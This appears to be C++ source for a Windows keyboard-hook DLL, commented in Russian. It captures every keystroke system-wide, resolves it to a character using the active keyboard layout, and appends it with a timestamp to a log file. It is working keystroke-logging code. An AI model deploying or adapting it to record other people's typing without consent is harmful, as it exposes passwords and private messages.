#include "pch.h"
#include "framework.h"
#include "kbhookproc.h"

std::string statsPath = "";
std::string modPath = "";
std::string badWords = "";

extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath) {
	statsPath = newPath;
}
extern "C" KBHOOKPROC_API void SetModPath(std::string newPath) {
	modPath = newPath;
}
extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath) {
	badWords = newPath;
}

extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
	_In_ int    code,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if(code < 0 ||
		wParam == VK_CONTROL ||
		wParam == VK_MENU || 
		wParam == VK_CAPITAL || 
		wParam == VK_SHIFT)
		return CallNextHookEx(NULL, code, wParam, lParam);

	if (lParam & 1<<31) {// 31bit keyDown

		//активный поток
		DWORD processId;
		DWORD activeThread = GetWindowThreadProcessId(
			GetForegroundWindow(), &processId);

		//раскладка клавиатуры в активном потоке
		auto kbLayout = GetKeyboardLayout(activeThread);


		UINT uScanCode = MapVirtualKeyEx(wParam, 0, kbLayout);
		BYTE keysState[256];
		WORD keySymbol;
		//состояние всех клавиш
		GetKeyboardState(keysState);

		//перевод vk_key или scan_code в символ с учетом раскладки (регистр не учитывается!)
		ToAsciiEx(wParam, uScanCode, keysState, &keySymbol, 0, kbLayout);
		char  charSymbol = char(keySymbol);

		//проверяем шифт и капслок (для регистра)
		if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
			(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
			charSymbol = toupper(charSymbol);

		//получаем текущее время
		auto start = std::chrono::system_clock::now();

		std::time_t end_time = std::chrono::system_clock::to_time_t(start);
		char timeBuff[50];
		ctime_s(timeBuff, sizeof(timeBuff), &end_time);

		//пишем в файл
		std::ofstream ofs(statsPath, std::ofstream::out | std::ofstream::app);
		ofs << "'" << charSymbol << "'" << " : " << timeBuff;
		ofs.close();

	}
	// CallNextHookEx чтобы остальные приложения могли ловить этот хук (проикдываем дальше)
	return CallNextHookEx(NULL, code, wParam, lParam);
}